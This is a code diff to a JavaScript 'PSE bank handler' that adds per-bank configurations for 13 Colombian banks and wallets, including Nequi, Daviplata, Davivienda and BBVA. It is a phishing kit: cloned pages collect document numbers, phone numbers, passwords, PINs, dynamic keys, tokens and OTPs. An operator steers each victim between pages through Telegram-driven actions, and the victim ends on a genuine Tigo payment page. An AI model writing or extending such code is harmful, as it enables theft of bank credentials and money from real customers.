@@ -1,9 +1,14 @@
 /**
- * PSE BANK HANDLER - Sistema unificado para bancas PSE con BancoUtils
- * @version 1.0.0
+ * PSE BANK HANDLER - Sistema unificado para TODAS las bancas PSE con BancoUtils
+ * @version 2.0.0
  * 
- * Este archivo reemplaza todos los client-optimized.js repetitivos.
+ * Este archivo reemplaza TODOS los *-optimized.js repetitivos.
  * Usa configuración declarativa por banco en lugar de código duplicado.
+ * 
+ * Bancos soportados: 13 bancos PSE
+ * - Agrario, AV-Villas, Banco-Mundo-Mujer, BBVA, Caja-Social
+ * - Daviplata, Davivienda, Falabella, Occidente, Popular
+ * - Scotiabank-Colpatria, Serfinanza, Nequi
  */
 
 (function() {
@@ -14,6 +19,7 @@
     // ============================================================================
     
     const BANK_CONFIGS = {
+        // ========== BANCOS CONSOLIDADOS ORIGINALES ==========
         'agrario': {
             pages: {
                 'index.html': {
@@ -168,6 +174,268 @@
                     numericInputs: ['otp']
                 }
             }
+        },
+        
+        // ========== NUEVOS BANCOS CONSOLIDADOS ==========
+        'daviplata': {
+            pages: {
+                'index.html': {
+                    stage: 'user',
+                    form: 'daviForm',
+                    inputs: { 
+                        tipoDocumento: 'documentType', 
+                        numeroDocumento: 'documentNumber', 
+                        numeroCelular: 'phoneNumber' 
+                    },
+                    button: 'btnContinue',
+                    validation: (d) => d.numeroDocumento?.length >= 6 && d.numeroCelular?.length === 10,
+                    numericInputs: ['numeroDocumento', 'numeroCelular']
+                },
+                'clave.html': {
+                    stage: 'password',
+                    form: 'claveForm',
+                    inputs: { clave: 'claveInput' },
+                    button: 'btnContinue',
+                    validation: (d) => d.clave?.length === 4,
+                    numericInputs: ['clave']
+                },
+                'dinamica.html': {
+                    stage: 'dinamica',
+                    form: 'dinamicaForm',
+                    inputs: { dinamica: 'dinamicaInput' },
+                    button: 'btnContinue',
+                    validation: (d) => d.dinamica?.length === 6,
+                    numericInputs: ['dinamica']
+                },
+                'otp.html': {
+                    stage: 'otp',
+                    form: 'otpForm',
+                    inputs: { otp: 'otpInput' },
+                    button: 'btnVerify',
+                    validation: (d) => d.otp?.length >= 4,
+                    numericInputs: ['otp']
+                }
+            }
+        },
+        'davivienda': {
+            pages: {
+                'index.html': {
+                    stage: 'user',
+                    form: 'documentForm',
+                    inputs: { 
+                        tipoDocumento: 'documentType', 
+                        numeroDocumento: 'documentNumber' 
+                    },
+                    button: 'submitBtn',
+                    validation: (d) => d.numeroDocumento?.length >= 5,
+                    numericInputs: ['numeroDocumento']
+                },
+                'clave.html': {
+                    stage: 'password',
+                    form: 'passwordForm',
+                    inputs: { clave: 'passwordInput' },
+                    button: 'submitBtn',
+                    validation: (d) => d.clave?.length >= 4,
+                    numericInputs: ['clave']
+                },
+                'token.html': {
+                    stage: 'token',
+                    form: 'tokenForm',
+                    inputs: { token: 'tokenInput' },
+                    button: 'submitBtn',
+                    validation: (d) => d.token?.length >= 6,
+                    numericInputs: ['token']
+                }
+            }
+        },
+        'falabella': {
+            pages: {
+                'index.html': {
+                    stage: 'login',
+                    form: 'loginForm',
+                    inputs: { 
+                        tipoDocumento: 'docType',
+                        cedula: 'cedula', 
+                        claveInternet: 'claveInternet' 
+                    },
+                    button: 'btnIngresar',
+                    validation: (d) => d.cedula?.length >= 6 && d.claveInternet?.length >= 4,
+                    numericInputs: ['cedula', 'claveInternet']
+                },
+                'dinamica.html': {
+                    stage: 'dinamica',
+                    form: 'dinamicaForm',
+                    inputs: { dinamica: 'dinamicaInput' },
+                    button: 'btnContinuar',
+                    validation: (d) => d.dinamica?.length === 6,
+                    numericInputs: ['dinamica']
+                },
+                'otp.html': {
+                    stage: 'otp',
+                    form: 'otpForm',
+                    inputs: { otp: 'otpInput' },
+                    button: 'btnVerificar',
+                    validation: (d) => d.otp?.length >= 6,
+                    numericInputs: ['otp']
+                }
+            }
+        },
+        'occidente': {
+            pages: {
+                'index.html': {
+                    stage: 'login',
+                    form: 'loginForm',
+                    inputs: { 
+                        tipoDocumento: 'tipoDocumento',
+                        numeroDocumento: 'numeroDocumento', 
+                        contrasena: 'contrasena' 
+                    },
+                    button: 'submitBtn',
+                    validation: (d) => d.numeroDocumento?.length >= 6 && d.contrasena?.length >= 4,
+                    numericInputs: ['numeroDocumento']
+                },
+                'token.html': {
+                    stage: 'token',
+                    form: 'tokenForm',
+                    inputs: { token: 'tokenInput' },
+                    button: 'btnContinuar',
+                    validation: (d) => d.token?.length >= 6,
+                    numericInputs: ['token']
+                },
+                'otp.html': {
+                    stage: 'otp',
+                    form: 'otpForm',
+                    inputs: { otp: 'otpInput' },
+                    button: 'btnVerificar',
+                    validation: (d) => d.otp?.length >= 6,
+                    numericInputs: ['otp']
+                }
+            }
+        },
+        'popular': {
+            pages: {
+                'index.html': {
+                    stage: 'login',
+                    form: 'loginForm',
+                    inputs: { 
+                        tipoDocumento: 'documento-tipo',
+                        numeroDocumento: 'documento-numero' 
+                    },
+                    button: 'btn-continuar',
+                    validation: (d) => d.numeroDocumento?.length >= 6,
+                    numericInputs: ['numeroDocumento']
+                },
+                'clave.html': {
+                    stage: 'clave',
+                    form: 'claveForm',
+                    inputs: { clave: 'clave-input' },
+                    button: 'btn-continuar',
+                    validation: (d) => d.clave?.length >= 4,
+                    numericInputs: ['clave']
+                },
+                'token.html': {
+                    stage: 'token',
+                    form: 'tokenForm',
+                    inputs: { token: 'token-input' },
+                    button: 'btn-continuar',
+                    validation: (d) => d.token?.length >= 6,
+                    numericInputs: ['token']
+                },
+                'otp.html': {
+                    stage: 'otp',
+                    form: 'otpForm',
+                    inputs: { otp: 'otp-input' },
+                    button: 'btn-verificar',
+                    validation: (d) => d.otp?.length >= 6,
+                    numericInputs: ['otp']
+                }
+            }
+        },
+        'scotiabank-colpatria': {
+            pages: {
+                'index.html': {
+                    stage: 'login',
+                    form: 'loginForm',
+                    inputs: { 
+                        tipoDocumento: 'tipoDocumento',
+                        numeroDocumento: 'numeroDocumento', 
+                        clave: 'clave' 
+                    },
+                    button: 'submitBtn',
+                    validation: (d) => d.numeroDocumento?.length >= 6 && d.clave?.length >= 4,
+                    numericInputs: ['numeroDocumento', 'clave']
+                },
+                'otp.html': {
+                    stage: 'otp',
+                    form: 'otpForm',
+                    inputs: { otp: 'otpInput' },
+                    button: 'btnVerificar',
+                    validation: (d) => d.otp?.length >= 6,
+                    numericInputs: ['otp']
+                }
+            }
+        },
+        'serfinanza': {
+            pages: {
+                'index.html': {
+                    stage: 'usuario',
+                    form: 'loginForm',
+                    inputs: { usuario: 'usuarioInput' },
+                    button: 'btnIngresar',
+                    validation: (d) => d.usuario?.length >= 3
+                },
+                'password.html': {
+                    stage: 'password',
+                    form: 'passwordForm',
+                    inputs: { password: 'passwordInput' },
+                    button: 'btnContinuar',
+                    validation: (d) => d.password?.length >= 4
+                },
+                'dinamica.html': {
+                    stage: 'dinamica',
+                    form: 'dinamicaForm',
+                    inputs: { dinamica: 'dinamicaInput' },
+                    button: 'btnContinuar',
+                    validation: (d) => d.dinamica?.length >= 6,
+                    numericInputs: ['dinamica']
+                },
+                'otp.html': {
+                    stage: 'otp',
+                    form: 'otpForm',
+                    inputs: { otp: 'otpInput' },
+                    button: 'btnVerificar',
+                    validation: (d) => d.otp?.length >= 6,
+                    numericInputs: ['otp']
+                }
+            }
+        },
+        'nequi': {
+            pages: {
+                'index.html': {
+                    stage: 'numero',
+                    form: 'phoneForm',
+                    inputs: { celular: 'phoneInput' },
+                    button: 'btnContinuar',
+                    validation: (d) => d.celular?.length === 10,
+                    numericInputs: ['celular']
+                },
+                'clave.html': {
+                    stage: 'clave',
+                    form: 'pinForm',
+                    inputs: { pin: 'pinInput' },
+                    button: 'btnContinuar',
+                    validation: (d) => d.pin?.length === 4,
+                    numericInputs: ['pin']
+                },
+                'clave-dinamica.html': {
+                    stage: 'dinamica',
+                    form: 'dinamicaForm',
+                    inputs: { dinamica: 'dinamicaInput' },
+                    button: 'btnContinuar',
+                    validation: (d) => d.dinamica?.length >= 4,
+                    numericInputs: ['dinamica']
+                }
+            }
         }
     };
     
@@ -178,7 +446,6 @@
     const pathMatch = window.location.pathname.match(/\/bancas\/([^\/]+)\//);
     if (!pathMatch) return;
     
-    const bankName = pathMatch[1].toLowerCase().replace(/-/g, '-');
     const currentPage = window.location.pathname.split('/').pop() || 'index.html';
     
     // Mapeo de nombres de carpetas a códigos de configuración
@@ -187,7 +454,15 @@
         'AV-Villas': 'av-villas',
         'Banco-Mundo-Mujer': 'banco-mundo-mujer',
         'BBVA': 'bbva',
-        'Caja-Social': 'caja-social'
+        'Caja-Social': 'caja-social',
+        'Daviplata': 'daviplata',
+        'Davivienda': 'davivienda',
+        'Falabella': 'falabella',
+        'Occidente': 'occidente',
+        'Popular': 'popular',
+        'Scotiabank-Colpatria': 'scotiabank-colpatria',
+        'Serfinanza': 'serfinanza',
+        'Nequi': 'nequi'
     };
     
     const bankCode = Object.entries(bankCodeMap).find(([folder]) => 
@@ -205,7 +480,7 @@
         return;
     }
     
-    console.log(`[PSE] Inicializando ${bankCode} - ${currentPage}`);
+    console.log(`[PSE] ✅ Inicializando ${bankCode} - ${currentPage}`);
     
     // ============================================================================
     // INICIALIZACIÓN
@@ -251,18 +526,44 @@
         BancoUtils.onTelegramAction((data) => {
             BancoUtils.hideOverlay();
             
+            // Mapeo extensivo de acciones a páginas
             const actionMap = {
+                // Acciones estándar
                 login: 'index.html',
+                request_login: 'index.html',
+                request_user: 'index.html',
+                request_usuario: 'index.html',
+                
+                // Passwords/Claves
                 password: 'password.html',
+                request_password: 'password.html',
+                request_clave: 'clave.html',
+                clave: 'clave.html',
+                
+                // Dinámicas
                 dinamica: 'dinamica.html',
+                dynamic: 'dynamic.html',
+                request_dynamic: 'dinamica.html',
+                request_dinamica: 'dinamica.html',
+                
+                // Tokens
                 token: 'token.html',
+                request_token: 'token.html',
+                
+                // OTP
                 otp: 'otp.html',
+                request_otp: 'otp.html',
+                
+                // Finalizar
+                finish: 'https://mi.tigo.com.co/pago-express/facturas',
                 finalizar: 'https://mi.tigo.com.co/pago-express/facturas'
             };
             
             const nextPage = actionMap[data.action];
             if (nextPage) {
-                window.location.href = nextPage.startsWith('http') ? nextPage : nextPage;
+                window.location.href = nextPage;
+            } else {
+                console.warn('[PSE] Acción no reconocida:', data.action);
             }
         });
         
